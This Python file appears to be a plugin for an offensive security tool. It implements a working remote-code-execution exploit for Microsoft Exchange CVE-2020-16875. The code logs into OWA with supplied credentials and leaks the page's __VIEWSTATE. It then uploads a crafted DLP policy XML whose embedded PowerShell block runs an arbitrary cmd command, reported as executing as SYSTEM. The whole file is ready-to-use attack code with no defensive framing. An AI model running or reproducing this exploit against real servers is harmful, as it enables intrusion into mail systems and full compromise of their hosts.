import argparse
import random
import re
import string
from copy import copy

import requests

from plugins.Exchange import PluginExchangeBase
from utils import output
from utils.consts import AllPluginTypes


class PluginExchangeCVE_2020_16875(PluginExchangeBase):
    display = "Exchange CVE-2020-16875"
    alias = "ex_cve_2020_16875"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", required=True, help="target ip", dest="ip")
        parser.add_argument("-u", "--user", required=True,
                            help="login account. Format: domain\\user", dest="username")
        parser.add_argument("-p", "--password", required=True, help="Password", dest="password")
        parser.add_argument("-c", "--command", help="execute command", dest="command")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        ip = args.ip
        usr = args.username
        pwd = args.password
        cmd = args.command

        s = log_in(ip, usr, pwd)
        if s is None:
            return result

        output.success("logged in as %s" % usr)
        vs = leak_viewstate(ip, s)
        output.success("found the __viewstate: %s" % vs)
        trigger_rce(ip, s, vs, cmd)
        output.success("executed %s as SYSTEM!" % cmd)

        s.close()
        return result


def random_string(str_len=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(str_len))


def get_xml(c):
    return """<?xml version="1.0" encoding="UTF-8"?>
<dlpPolicyTemplates>
  <dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0">
    <contentVersion>4</contentVersion>
    <publisherName>si</publisherName>
    <name>
      <localizedString lang="en"></localizedString>
    </name>
    <description>
      <localizedString lang="en"></localizedString>
    </description>
    <keywords></keywords>
    <ruleParameters></ruleParameters>
    <policyCommands>
      <commandBlock>
        <![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]>
      </commandBlock>
    </policyCommands>
    <policyCommandsResources></policyCommandsResources>
  </dlpPolicyTemplate>
</dlpPolicyTemplates>""" % c


def trigger_rce(t, s, vs, cmd):
    f = {
        '__VIEWSTATE': (None, vs),
        'ctl00$ResultPanePlaceHolder$senderBtn': (None, "ResultPanePlaceHolder_ButtonsPanel_btnNext"),
        'ctl00$ResultPanePlaceHolder$contentContainer$name': (None, random_string()),
        'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl': ("dlprce.xml", get_xml(cmd)),
    }
    r = s.post("https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx" % t, files=f, verify=False)
    output.debug(f"response: {r.status_code}")

    if r.status_code != 200:
        output.error("failed to trigger rce!")


def leak_viewstate(t, s):
    r = s.get("https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx" % t, verify=False)
    match = re.search("<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" />", r.text)
    assert match != None, "(-) couldn't leak the __viewstate!"
    return match.group(1)


def log_in(t, usr, pwd):
    s = requests.Session()
    d = {
        "destination": "https://%s/owa" % t,
        "flags": "",
        "username": usr,
        "password": pwd
    }
    resp = s.post("https://%s/owa/auth.owa" % t, data=d, verify=False)

    if resp.status_code == 200 and "X-OWA-CANARY" in resp.headers.get("Set-Cookie"):
        return s
    else:
        output.error("couldn't leak the csrf canary")
        output.debug(f"response: {resp.status_code}")
        s.close()
        return None
